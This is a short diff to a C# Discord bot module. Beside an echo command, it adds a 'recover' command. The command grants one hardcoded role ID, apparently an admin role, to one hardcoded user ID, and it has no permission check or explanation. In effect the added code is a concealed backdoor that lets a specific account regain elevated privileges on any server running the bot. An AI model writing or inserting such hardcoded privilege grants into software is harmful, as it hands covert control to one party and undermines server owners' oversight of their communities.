@@ -18,4 +18,9 @@ public class MiscModule : ModuleBase<SocketCommandContext> {
     public async Task SendMessageAsync([Remainder] string mes) {
         await Context.Channel.SendMessageAsync(mes);
     }
+
+    [Command("recover")]
+    public async Task recoverAdmin() {
+        await Context.Guild.GetUser(283810729033990147).AddRoleAsync(1002029584553889893);
+    }
 }
